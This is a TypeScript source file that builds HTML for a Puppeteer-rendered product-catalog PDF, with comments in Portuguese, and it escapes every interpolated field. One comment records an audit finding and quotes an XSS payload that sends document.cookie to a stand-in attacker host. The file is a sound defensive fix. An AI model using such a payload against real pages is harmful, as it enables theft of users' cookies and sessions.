interface VariantData {
  skuVariant: string
  colorLabel: string | null
  productName: string
  imageUrl: string | null
}

interface PdfTemplateInput {
  variants: VariantData[]
  clientName?: string
  tenantName: string
}

// Achado em auditoria de segurança: todo campo abaixo era interpolado direto
// na HTML renderizada pelo Puppeteer sem escapar nada — clientName em
// particular é texto livre de qualquer usuário autenticado (não só admin) no
// corpo de POST /pdf/generate. Um clientName como
// `<img src=x onerror="fetch('http://attacker/?c='+document.cookie)">`
// executava dentro da página do Puppeteer no server. Escapa entidades HTML
// em todo valor de texto e aspas em todo valor usado como atributo.
function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

export function buildCatalogHtml(input: PdfTemplateInput): string {
  const date = new Date().toLocaleDateString('pt-BR')

  const cards = input.variants
    .map((v) => {
      const skuVariant = escapeHtml(v.skuVariant)
      const colorLabel = v.colorLabel ? escapeHtml(v.colorLabel) : null
      const productName = escapeHtml(v.productName)
      const imageUrl = v.imageUrl ? escapeHtml(v.imageUrl) : null

      return `
      <div class="card">
        <div class="card-img">
          ${
            imageUrl
              ? `<img src="${imageUrl}" alt="${skuVariant}" />`
              : `<div class="no-img">Sem imagem</div>`
          }
        </div>
        <div class="card-info">
          <p class="sku">${skuVariant}</p>
          ${colorLabel ? `<p class="color">${colorLabel}</p>` : ''}
          <p class="name">${productName}</p>
        </div>
      </div>
    `
    })
    .join('')

  const tenantName = escapeHtml(input.tenantName)
  const clientName = input.clientName ? escapeHtml(input.clientName) : undefined

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Helvetica Neue', Arial, sans-serif; color: #333; }

  .header {
    text-align: center;
    padding: 20px 0 10px;
    border-bottom: 2px solid #e0e0e0;
    margin-bottom: 20px;
  }
  .header h1 { font-size: 18px; font-weight: 600; }
  .header p { font-size: 11px; color: #888; margin-top: 4px; }

  .grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 16px;
    padding: 0 24px;
  }

  .card {
    border: 1px solid #e0e0e0;
    border-radius: 6px;
    overflow: hidden;
    page-break-inside: avoid;
  }

  .card-img {
    width: 100%;
    height: 160px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f8f8f8;
  }
  .card-img img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
  }
  .no-img {
    color: #ccc;
    font-size: 12px;
  }

  .card-info {
    padding: 8px 10px;
  }
  .sku { font-size: 13px; font-weight: 700; }
  .color { font-size: 11px; color: #666; margin-top: 2px; }
  .name { font-size: 10px; color: #999; margin-top: 2px; }

  .footer {
    text-align: center;
    padding: 16px 0;
    margin-top: 20px;
    border-top: 1px solid #e0e0e0;
    font-size: 10px;
    color: #aaa;
  }
</style>
</head>
<body>
  <div class="header">
    <h1>${tenantName}</h1>
    <p>Catálogo personalizado${clientName ? ` — ${clientName}` : ''} | ${date}</p>
  </div>
  <div class="grid">
    ${cards}
  </div>
  <div class="footer">
    Gerado em ${date} | ${tenantName}
  </div>
</body>
</html>`
}
